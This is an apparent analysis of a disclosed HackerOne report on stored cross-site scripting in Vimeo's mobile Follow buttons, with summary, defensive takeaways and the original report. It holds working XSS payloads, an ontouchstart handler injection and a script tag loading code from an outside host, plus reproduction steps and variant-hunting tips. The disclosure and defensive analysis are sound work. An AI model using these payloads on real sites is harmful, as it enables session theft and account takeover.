# Stored XSS in Follow Button via Unescaped Channel/User Names on Vimeo Mobile

## Metadata
- **Source:** HackerOne
- **Report:** 88088 | https://hackerone.com/reports/88088
- **Submitted:** 2015-09-09
- **Reporter:** stefanovettorazzi
- **Program:** Vimeo
- **Bounty:** Not specified in report
- **Severity:** High
- **Vuln:** Stored Cross-Site Scripting (XSS), Improper Output Encoding, HTML Attribute Injection
- **CVEs:** None
- **Category:** web-api

## Summary
Vimeo's mobile web version fails to properly escape user and channel names when rendering Follow buttons, allowing attackers to inject arbitrary HTML and JavaScript code. The vulnerability exists across multiple locations including channel pages, user profiles, and follow lists, with some variants requiring no user interaction to trigger.

## Attack scenario
1. Attacker creates a Vimeo channel or modifies their profile name to include malicious payload (e.g., '" ontouchstart="alert(document.domain)' or '"><script src=//attacker.xyz>')
2. Attacker shares the channel/profile URL with victims or waits for organic discovery on the platform
3. Victim accesses the malicious page using Vimeo's mobile web version
4. Victim interacts with the Follow button (or page loads in case of script injection) on the mobile interface
5. JavaScript payload executes in victim's browser with full access to Vimeo's session and data
6. Attacker can steal session cookies, perform actions as the victim, redirect to phishing sites, or harvest credentials

## Root cause
The mobile web application constructs Follow buttons by directly inserting user/channel names into HTML attributes without proper escaping or encoding. The vulnerable code likely concatenates user input directly into button element attributes or inner HTML, failing to sanitize special characters that can break out of HTML context.

## Attacker mindset
An attacker recognizes that user-controllable fields (names, descriptions) are rendered in interactive UI components without sanitization. They identify that the mobile version has weaker protections than desktop and that Follow buttons are high-interaction elements that many users will click. They craft payloads that work within HTML attribute context and can be triggered by touch events on mobile devices.

## Defensive takeaways
- Implement consistent output encoding across all platforms (desktop and mobile) using context-aware escaping (HTML entity encoding for HTML content, JavaScript encoding for attributes, URL encoding for URLs)
- Use templating engines with automatic escaping enabled by default rather than manual string concatenation
- Apply Content Security Policy (CSP) to prevent inline script execution and restrict external script sources
- Validate and sanitize all user-generated content at input boundaries, with allowlist-based approach for profile/channel names
- Implement security code reviews focusing on data flow from user input to output rendering
- Use security testing tools to automatically detect XSS vulnerabilities across responsive design breakpoints

## Variant hunting
Search for other user-controllable fields rendered in buttons or interactive elements (video titles, playlist names, group names)
Check if similar Follow patterns exist in other user interaction features (Favorite, Share, Subscribe buttons)
Test whether the vulnerability extends to other attributes like title, aria-label, data-* attributes
Investigate if description fields have similar encoding issues
Check API endpoints to see if they return unescaped user data that gets rendered client-side
Test with various payload formats (event handlers, onerror, onload) across different touch/click event types

## MITRE ATT&CK
- T1190
- T1566.002
- T1204.001
- T1539
- T1185

## Notes
This is a classic stored XSS vulnerability with high impact due to the social nature of the platform and high visibility of user profiles/channels. The fact that it affects both user profiles and channel names shows systemic issues in the output encoding layer. The report demonstrates two attack variants: one requiring user interaction (button click on channel) and one without interaction (profile script tag), indicating multiple injection points with varying complexity. The vulnerability likely affects other features beyond Follow buttons, making it a platform-wide concern rather than isolated to one feature.

## Full report
<details><summary>Expand</summary>

__Description__

In the mobile version of https://vimeo.com, you will see _+ Follow_ buttons in places like the description of a channel, the description of a video, the profile of a user, the list of users you follow and the list of users that other users follow.
The problem is that the code that builds the button doesn't escape the Name of the channel or user. This allows to insert HTML code, even in the channel Name because the value is inserted as attribute of a `<button>` element.

__Proof of concept__

Channel page. Requires user interaction:
    1. Using the desktop web version of Vimeo, go to https://vimeo.com/[your_vimeo_url]/channels (like https://vimeo.com/user36690798/channels).
    2. Click on _+ Create new channel_ at the right of the page.
    3. Enter `" ontouchstart="alert(document.domain)` for _Channel Name_.
    4. Click on _Create This Channel_.
    5. Copy & save the URL of the new Channel.
    6. Using the mobile web version of Vimeo and other user, go to the URL you saved in the last step (like https://vimeo.com/channels/963609).
    7. Touch on _+ Follow_.
    8. `alert(document.domain)` is executed.
I have a Channel with the XSS here https://vimeo.com/channels/962193.

Profile page. Doesn't require user interaction:
    1. Using the web version of Vimeo, go to https://vimeo.com/settings.
    2. Copy & save your _Vimeo URL_.
    3. Change your _Name_ to `"><script src=//u00f1.xyz>`.
    4. Click on _Save Changes_.
    5. Using the mobile web version of Vimeo and other user, go to the URL you saved in step 2.
    6. `alert(document.domain)` is executed.
I have a profile with the XSS here https://vimeo.com/user36690798.

I think that the bug is in the code that builds the _+ Follow_ button, because the same vulnerability is in the other places I mentioned in the Description.

</details>

---
*Analysed by Claude on 2026-05-24*
